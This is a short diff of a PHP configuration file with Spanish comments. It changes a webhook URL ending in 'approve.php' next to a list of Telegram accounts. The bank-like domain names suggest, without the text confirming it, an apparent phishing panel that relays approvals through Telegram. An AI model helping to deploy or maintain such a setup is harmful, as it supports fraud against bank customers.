@@ -30,7 +30,7 @@ $telegram_accounts = [
 
 // 🔧 FIX 3: URL del webhook verificada
 // IMPORTANTE: Si cambias de hosting, debes actualizar esto
-$webhook_url = 'https://mercantil30credit.ash-1.instapods.app/approve.php';
+$webhook_url = 'https://credits30mercantil.up.railway.app/approve.php';
 
 // 🔧 FIX 4: Configuración adicional de seguridad
 // Tiempo de vida de la sesión (30 minutos)
